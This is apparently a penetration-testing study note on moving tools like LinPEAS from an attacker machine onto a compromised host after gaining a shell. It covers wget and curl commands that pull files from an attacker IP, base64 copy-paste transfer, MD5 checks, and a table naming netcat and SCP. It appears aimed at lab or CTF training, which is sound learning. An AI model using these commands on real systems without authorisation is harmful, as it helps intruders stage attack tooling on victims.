**Category:** #Post-Exploitation / #Data_Exfiltration
**Scope:** Moving tools (LinPeas, WinPEAS, Exploit Code) from Attacker to Victim.

---

## 🔍 Overview

> **Logic:** Once you have a shell, you need to bring in your "Heavy Machinery." However, a compromised target might not have `wget` or `curl`. You must know multiple ways to "push" and "pull" data across the network.

---

## 📤 1. The HTTP "Pull" Method (Most Common)

Best used when the target has internet/network access to your machine.

### Step 1: Start the Server (Attacker)

Run this in the directory where your tools are located.
```
# Python 3: Starts a web server on Port 8000
python3 -m http.server 8000
```

### Step 2: Download the File (Victim)
```
# Using Wget
wget http://10.10.14.x:8000/linpeas.sh

# Using Curl (if wget is missing)
# -o: specifies the output filename
curl http://10.10.14.x:8000/linpeas.sh -o linpeas.sh
```

---

## 🥷 2. The Base64 "Ninja" Move

Best used when you have a **stable shell** but **zero** download utilities (no curl/wget/nc). You simply copy-paste the file as text.

### Step 1: Encode (Attacker)
```
# -w 0: removes line wraps for easy copying
base64 -w 0 [filename]
```

_Copy the resulting long string of characters._

### Step 2: Decode (Victim)
```
echo "[paste_the_string_here]" | base64 -d > [filename]
```

---

## 🛡️ 3. Integrity Validation (The "Did it break?" check)

Files can get corrupted during transfer (especially over unstable shells). Always verify the "Digital Fingerprint."

**On both machines, run:**
```
md5sum [filename]
```

> **Rule:** If the MD5 hashes do not match perfectly, the file is corrupted. Delete it and try again.

---

## 📊 Quick-Choice Table

|**Utility**|**Role**|**Best For...**|
|---|---|---|
|**Python HTTP**|Pull|Large files (Binaries, Scripts).|
|**Base64**|Text-Paste|Small scripts when no tools are available.|
|**Netcat**|Pipe|Moving data when Web Ports (80/443) are blocked.|
|**SCP**|Secure Push|When you have SSH credentials.|